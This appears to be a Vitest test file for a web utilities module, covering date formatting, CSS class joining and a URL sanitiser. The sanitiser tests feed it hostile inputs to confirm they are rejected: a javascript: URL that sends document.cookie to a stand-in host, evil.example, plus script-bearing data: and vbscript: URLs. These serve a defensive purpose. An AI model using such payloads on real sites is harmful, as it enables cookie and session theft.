import { afterEach, describe, expect, it } from 'vitest';

import { cn, DATE_FALLBACK, formatDate, safeExternalHref } from '@/lib/utils';

const originalTz = process.env.TZ;
const originalLang = process.env.LANG;

/**
 * withEnvironment runs a callback with the ambient timezone and locale
 * environment variables temporarily replaced, so a formatter can be checked for
 * independence from the environment it happens to run in.
 *
 * @param env - timezone and locale to apply for the duration of the callback.
 * @param run - callback producing the value under test.
 * @returns the value returned by the callback.
 */
function withEnvironment<T>(
  env: { tz: string; lang: string },
  run: () => T,
): T {
  process.env.TZ = env.tz;
  process.env.LANG = env.lang;
  return run();
}

afterEach(() => {
  process.env.TZ = originalTz;
  process.env.LANG = originalLang;
});

describe('formatDate', () => {
  it('formats an ISO8601 timestamp as a fixed UTC date', () => {
    expect(formatDate('2024-03-07T09:15:00Z')).toBe('07 Mar 2024');
  });

  it('renders the UTC calendar day, not the ambient local one', () => {
    // 23:30Z is already the next day east of UTC and still the previous day
    // west of it; the UTC day is the only stable answer.
    expect(formatDate('2024-03-07T23:30:00Z')).toBe('07 Mar 2024');
    expect(formatDate('2024-03-07T00:30:00Z')).toBe('07 Mar 2024');
  });

  it('returns byte-identical output under differing TZ and locale', () => {
    const value = '2024-03-07T23:30:00Z';
    const results = [
      { tz: 'UTC', lang: 'en_US.UTF-8' },
      { tz: 'Pacific/Kiritimati', lang: 'de_DE.UTF-8' },
      { tz: 'Pacific/Niue', lang: 'ja_JP.UTF-8' },
      { tz: 'Asia/Kolkata', lang: 'C' },
    ].map((env) => withEnvironment(env, () => formatDate(value)));

    expect(new Set(results).size).toBe(1);
    expect(results[0]).toBe('07 Mar 2024');
  });

  it('accepts a timestamp with an explicit non-UTC offset', () => {
    expect(formatDate('2024-03-07T01:30:00+05:30')).toBe('06 Mar 2024');
  });

  it('returns the fallback for a null or absent value', () => {
    expect(formatDate(null)).toBe(DATE_FALLBACK);
    expect(formatDate(undefined)).toBe(DATE_FALLBACK);
  });

  it('returns the fallback for an empty or whitespace-only value', () => {
    expect(formatDate('')).toBe(DATE_FALLBACK);
    expect(formatDate('   ')).toBe(DATE_FALLBACK);
  });

  it('returns the fallback for an unparseable value', () => {
    expect(formatDate('not-a-date')).toBe(DATE_FALLBACK);
  });

  it('never renders "null" or "Invalid Date"', () => {
    for (const value of [null, undefined, '', '   ', 'not-a-date']) {
      const formatted = formatDate(value);
      expect(formatted).not.toContain('null');
      expect(formatted).not.toContain('Invalid Date');
    }
  });

  it('uses a caller-supplied fallback when one is given', () => {
    expect(formatDate(null, 'Present')).toBe('Present');
    expect(formatDate('2024-03-07T09:15:00Z', 'Present')).toBe('07 Mar 2024');
  });
});

describe('cn', () => {
  it('joins the class names it is given', () => {
    expect(cn('rounded', 'border')).toBe('rounded border');
  });

  it('drops falsy and conditional entries', () => {
    expect(cn('rounded', false, null, undefined, '', 0 && 'hidden')).toBe(
      'rounded',
    );
  });

  it('flattens arrays and object maps of conditional classes', () => {
    expect(cn(['rounded', ['border']], { hidden: false, flex: true })).toBe(
      'rounded border flex',
    );
  });

  it('returns an empty string when nothing applies', () => {
    expect(cn(undefined, false)).toBe('');
  });
});

describe('safeExternalHref', () => {
  it('accepts an absolute http and https URL, returning it unchanged', () => {
    expect(safeExternalHref('https://subagents.dev')).toBe(
      'https://subagents.dev',
    );
    expect(safeExternalHref('http://localhost:8080/path?q=1')).toBe(
      'http://localhost:8080/path?q=1',
    );
  });

  it('rejects a javascript: URL', () => {
    expect(
      safeExternalHref(
        "javascript:fetch('https://evil.example/'+document.cookie)",
      ),
    ).toBeNull();
    // Scheme matching is case-insensitive and tolerates leading whitespace,
    // both of which a browser normalises away before executing the URL.
    expect(safeExternalHref('  JaVaScRiPt:alert(1)')).toBeNull();
  });

  it('rejects a data: URL', () => {
    expect(
      safeExternalHref(
        'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
      ),
    ).toBeNull();
  });

  it('rejects a vbscript: URL', () => {
    expect(safeExternalHref('vbscript:msgbox(1)')).toBeNull();
  });

  it('rejects a value that is not an absolute URL at all', () => {
    expect(safeExternalHref('/projects')).toBeNull();
    expect(safeExternalHref('not a url')).toBeNull();
    expect(safeExternalHref('')).toBeNull();
  });

  it('rejects a missing value', () => {
    expect(safeExternalHref(null)).toBeNull();
    expect(safeExternalHref(undefined)).toBeNull();
  });
});
